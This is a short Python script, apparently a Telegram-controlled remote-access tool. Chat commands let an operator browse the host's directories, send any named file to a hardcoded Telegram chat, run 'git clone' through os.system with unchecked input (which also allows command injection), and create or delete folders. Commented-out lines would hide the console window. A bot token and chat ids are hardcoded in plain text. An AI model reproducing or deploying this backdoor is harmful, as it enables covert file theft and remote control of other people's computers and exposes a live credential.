#import win32console
#import win32gui
import telebot
import os 

#ventana = win32console.GetConsoleWindow()
#win32gui.ShowWindow(ventana, 0)

token = '5671507424:AAHHp_PP01haxJgidIaTuFrPZd8uFIOyE-s'
bot = telebot.TeleBot(token)
chid_al2 = 759118377
chid_Ana = 1431807252
def directorios(messages):
    for m in messages:
        chatid = chid_al2
        #chatid = m.chat.id
        print(chatid)
        
        if m.content_type == 'text':
            text = m.text
            if text.find('dir') != -1:
                words = text.split()
                directorio = os.getcwd()
                bot.send_message(chatid, directorio)
            elif text.find('Dir') != -1:
                words = text.split()
                directorio = os.getcwd()
                bot.send_message(chatid, directorio)
            elif text.find('ls') != -1:
                words = text.split()
                lista_archivos = os.listdir()
                #archivos_separados = lista_archivos.split()
                for i in lista_archivos:
                    bot.send_message(chatid, i)
            elif text.find('Ls') != -1:
                words = text.split()
                lista_archivos = os.listdir()
                #archivos_separados = lista_archivos.split()
                for i in lista_archivos:
                    bot.send_message(chatid, i)
            elif text.find('cd') != -1:
                words = text.split()
                word = words[1:]
                archivo = ' '.join(word)
                os.chdir(archivo)
                #print(words)
                bot.send_message(chatid, os.getcwd())
            elif text.find('Cd') != -1:
                words = text.split()
                word = words[1:]
                archivo = ' '.join(word)
                os.chdir(archivo)
                #print(words)
                bot.send_message(chatid, os.getcwd())
            elif text.find('open') != -1:
                words = text.split()
                word = words[1:]
                archivo = ' '.join(word)
                print(word)
                with open(archivo, 'rb') as documento:
                    #archivos = os.getcwd()+words[1]
                    bot.send_document(chatid, documento)
            elif text.find('Open') != -1:
                words = text.split()
                word = words[1:]
                archivo = ' '.join(word)
                print(word)
                with open(archivo, 'rb') as documento:
                    #archivos = os.getcwd()+words[1]
                    bot.send_document(chatid, documento)
            elif text.find('get') != -1:
                words = text.split()
                word = words[1:]
                archivo = ' '.join(word)
                os.system(f'git clone {archivo}')
                #print(words)
                bot.send_message(chatid, 'quedo bien')
def carpetas(messages):
    for m in messages:
        chatid = m.chat.id
        if m.content_type == 'text':
            text = m.text
            if text.find('Crear carpeta') != -1:
                words = text.split()
                os.mkdir(words[2])
                bot.send_message(chatid, "La carpeta {} fue creada".format(words[2]))
            if text.find('crear carpeta') != -1:
                words = text.split()
                os.mkdir(words[2])
                bot.send_message(chatid, "La carpeta {} fue creada".format(words[2]))
            elif text.find('Eliminar carpeta') != -1:
                words = text.split()
                if os.path.exists(words[2]):
                    os.rmdir(words[2])
                    bot.send_message(chatid, 'Se elimino la carpeta ' + words[2])
                else:
                    bot.send_message(chatid, 'la capeta no existe')
            elif text.find('eliminar carpeta') != -1:
                words = text.split()
                if os.path.exists(words[2]):
                    os.rmdir(words[2])
                    bot.send_message(chatid, 'Se elimino la carpeta ' + words[2])
                else:
                    bot.send_message(chatid, 'la capeta no existe')

bot.set_update_listener(directorios)
bot.set_update_listener(carpetas)
bot.infinity_polling()